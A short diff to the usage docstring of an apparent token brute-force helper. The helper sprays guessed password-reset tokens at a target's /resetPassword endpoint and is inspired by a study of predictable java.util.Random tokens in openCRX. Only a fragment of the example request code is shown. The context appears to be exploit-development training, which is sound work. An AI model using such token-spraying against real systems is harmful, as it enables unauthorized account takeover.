@@ -8,8 +8,7 @@ spray loop, progress printing, and early exit.
 
 Inspired by the openCRX chapter (non-random Java.util.Random password reset tokens).
 
-Usage:
-    from token_bruteforce import spray_tokens
+Usage (copy spray_tokens into your exploit script):
 
     def try_token(token: str) -> bool:
         r = session.post(TARGET + "/resetPassword", data={
